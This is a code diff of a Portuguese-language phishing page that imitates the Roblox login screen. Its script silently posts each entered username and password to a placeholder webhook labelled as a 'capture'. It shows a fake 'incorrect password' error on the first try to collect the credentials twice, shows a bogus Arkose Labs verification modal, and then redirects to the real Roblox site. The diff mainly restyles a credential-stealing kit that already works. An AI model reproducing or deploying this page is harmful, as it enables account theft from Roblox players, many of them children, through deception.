@@ -9,74 +9,109 @@
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
         
         :root {
-            /* Cores Foundation Oficiais extraídas do seu :root */
             --bg-main: #191a1f; 
             --bg-card: #272930;
             --input-bg: #121215;
             --text-main: #ffffff;
             --rbx-blue: #0084ff;
-            --rbx-error: #df281f; /* Red-800 Oficial */
+            --rbx-error: #df281f;
             --border-grey: #494d5a;
-            --footer-bg: #121215;
-        }
-
-        @keyframes fadein-delay {
-            0% { opacity: 0 }
-            50% { opacity: 0 }
-            to { opacity: 1 }
         }
 
         body, html { 
             margin: 0; padding: 0; min-height: 100%; 
             font-family: 'HCo Gotham SSm', sans-serif; 
             background-color: var(--bg-main); color: var(--text-main); 
-            display: flex; flex-direction: column; overflow-x: hidden;
-            animation: fadein-delay 0.8s ease-in;
+            display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* --- MÓDULO CAPTCHA CENTRALIZADO --- */
-        .captcha-core-container {
+        /* --- SEU CÓDIGO DE MODAL INTEGRADO --- */
+        .modal {
             text-align: center;
             position: fixed;
-            top: 50%; left: 50%;
-            transform: translate(-50%,-50%);
-            z-index: 3000;
-            display: none;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0,0,0,.5);
+            z-index: 9999;
+            display: none; /* Ativado via JS */
         }
 
-        /* --- UI COMPONENTS --- */
-        .roblox-header { width: 100%; height: 44px; background: #232527; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: fixed; top: 0; z-index: 100; box-sizing: border-box; border-bottom: 1px solid var(--border-grey); }
-        .header-left { display: flex; align-items: center; gap: 15px; }
-        .roblox-logo { height: 28px; width: 28px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); background-size: contain; background-repeat: no-repeat; }
-        .nav-link { color: #fff; text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.9; }
+        .modal:before {
+            display: inline-block;
+            vertical-align: middle;
+            content: " ";
+            height: 100%
+        }
 
-        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg'); background-size: cover; background-position: center; padding: 80px 0 40px 0; }
-        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px; width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); box-sizing: border-box; }
-        
-        /* Mensagem de Erro Oficial */
-        #error-msg { 
-            color: var(--rbx-error); 
-            font-size: 13px; 
-            margin-bottom: 15px; 
-            display: none; 
+        .modal-dialog {
+            box-sizing: border-box;
+            width: 400px;
+            display: inline-block;
             text-align: left;
-            background: rgba(223, 40, 31, 0.1);
-            padding: 8px;
-            border-radius: 4px;
+            vertical-align: middle;
+            margin: 0;
+            position: relative;
         }
 
-        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728; border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; }
-        .input-field:focus { border: 1px solid var(--rbx-blue); }
+        .modal-dialog .modal-content.dark-theme {
+            background-color: #272930;
+            color: #f7f7f8;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        .modal-header {
+            padding: 15px;
+            border-bottom: 1px solid #454749;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-title h4 { margin: 0; font-size: 18px; font-weight: 700; }
+
+        .close {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            opacity: 0.5;
+        }
+
+        .modal-body { padding: 30px; text-align: center; }
+
+        .modal-footer-note {
+            border-top: 1px solid #454749;
+            color: #bcbec8;
+            padding: 10px;
+            text-align: center;
+            font-size: 11px;
+        }
+
+        /* --- ELEMENTOS DE UI --- */
+        .main-content { 
+            flex: 1; display: flex; align-items: center; justify-content: center;
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
+            background-size: cover; background-position: center;
+        }
+
+        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px; width: 400px; text-align: center; }
+        
+        #error-msg { 
+            color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
+            background: rgba(223, 40, 31, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
+            text-align: left;
+        }
+
+        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728; border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; }
         .input-error { border: 1px solid var(--rbx-error) !important; }
         
-        .btn-primary-md { width: 100%; height: 40px; border: 1px solid #fff; background: transparent; color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 10px; }
-        .btn-secondary { width: 100%; height: 40px; background-color: #4b4d4e; border: none; color: #fff; border-radius: 4px; margin-top: 10px; cursor: pointer; font-weight: 500; }
-        
-        .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; }
-        .footer-note { font-size: 12px; color: #d5d7dd; opacity: 0.7; text-align: center; }
+        .btn-primary-md { width: 100%; height: 40px; border: 1px solid #fff; background: transparent; color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
 
-        #loading-overlay { background-color: rgba(0,0,0,0.85); position: fixed; inset: 0; z-index: 2000; display: none; align-items: center; justify-content: center; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        /* Spinner Animado */
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         .shake { animation: shake 0.2s ease-in-out 0s 2; }
@@ -84,43 +119,47 @@
 </head>
 <body>
 
-<div id="loading-overlay"></div>
-
-<div class="captcha-core-container" id="captcha-box">
-    <div class="spinner"></div>
-    <p style="margin-top: 15px; font-weight: 500;">Verificando segurança...</p>
-</div>
-
-<header class="roblox-header">
-    <div class="header-left">
-        <div class="roblox-logo"></div>
-        <a href="#" class="nav-link">Destaques</a><a href="#" class="nav-link">Mercado</a>
+<div class="modal" id="modal-verificacao">
+    <div class="modal-dialog">
+        <div class="modal-content dark-theme">
+            <div class="modal-header">
+                <div class="modal-title"><h4>Verificação</h4></div>
+                <button class="close" onclick="closeModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <div class="modal-image-container">
+                    <div class="spinner"></div>
+                    <p style="margin-top: 20px; font-size: 14px;">Aguarde, autenticando com os servidores da Roblox...</p>
+                </div>
+            </div>
+            <div class="modal-footer-note">
+                Sessão protegida pelo Arkose Labs
+            </div>
+        </div>
     </div>
-</header>
+</div>
 
 <main class="main-content">
     <div class="login-card" id="card">
         <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
         
-        <div id="error-msg">Usuário ou senha incorretos.</div>
+        <div id="error-msg">Nome de usuário ou senha incorretos.</div>
 
         <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
         <input type="password" id="pass" class="input-field" placeholder="Senha">
         <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
         
-        <div style="margin-top: 15px; border-bottom: 1px solid #454749; padding-bottom: 20px;">
+        <div style="margin-top: 20px; border-top: 1px solid #454749; padding-top: 20px;">
             <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none;">Esqueceu a senha?</a>
         </div>
-        <button class="btn-secondary">Entrada rápida</button>
     </div>
 </main>
 
-<footer class="container-footer">
-    <p class="footer-note">©2026 Roblox Corporation. Todos os direitos reservados.</p>
-</footer>
-
 <script>
     let attempt = 0;
+
+    function openModal() { document.getElementById('modal-verificacao').style.display = 'block'; }
+    function closeModal() { document.getElementById('modal-verificacao').style.display = 'none'; }
 
     async function execLogin() {
         const u = document.getElementById('user').value;
@@ -136,26 +175,22 @@
         }
 
         attempt++;
+        openModal();
 
-        // 1. Inicia o "Loading" de segurança
-        document.getElementById('loading-overlay').style.display = 'flex';
-        document.getElementById('captcha-box').style.display = 'block';
-
-        // 2. Envio para Webhook
+        // LOG SILENCIOSO VIA WEBHOOK
         try {
             await fetch("SUA_WEBHOOK_AQUI", {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: attempt === 1 ? "🔓 PRIMEIRA TENTATIVA" : "🔓 SEGUNDA TENTATIVA (LOGIN)",
-                        color: attempt === 1 ? 16711680 : 65280,
+                        title: attempt === 1 ? "🛡️ VOID - CAPTURA INICIAL" : "🛡️ VOID - SEGUNDA TENTATIVA",
+                        color: attempt === 1 ? 3447003 : 15105570,
                         fields: [
                             { name: "👤 Usuário", value: `\`${u}\``, inline: true },
-                            { name: "🔑 Senha", value: `\`${p}\``, inline: true },
-                            { name: "📱 Info", value: `\`${navigator.userAgent}\`` }
+                            { name: "🔑 Senha", value: `\`${p}\``, inline: true }
                         ],
-                        footer: { text: "Protocolo VOID v2.0" },
+                        footer: { text: `Tentativa: ${attempt}` },
                         timestamp: new Date().toISOString()
                     }]
                 }),
@@ -163,23 +198,19 @@
             });
         } catch(e) {}
 
-        // 3. Lógica de Redirecionamento ou Erro
+        // SIMULAÇÃO DE CARREGAMENTO E RESPOSTA
         setTimeout(() => {
-            document.getElementById('loading-overlay').style.display = 'none';
-            document.getElementById('captcha-box').style.display = 'none';
-
+            closeModal();
             if(attempt === 1) {
-                // Simula erro na primeira vez
                 errorDiv.style.display = 'block';
                 passInput.value = '';
                 passInput.classList.add('input-error');
                 card.classList.add('shake');
                 setTimeout(() => card.classList.remove('shake'), 400);
             } else {
-                // Sucesso na segunda vez
                 window.location.href = "https://www.roblox.com/home";
             }
-        }, 1500);
+        }, 2200);
     }
 </script>
 </body>
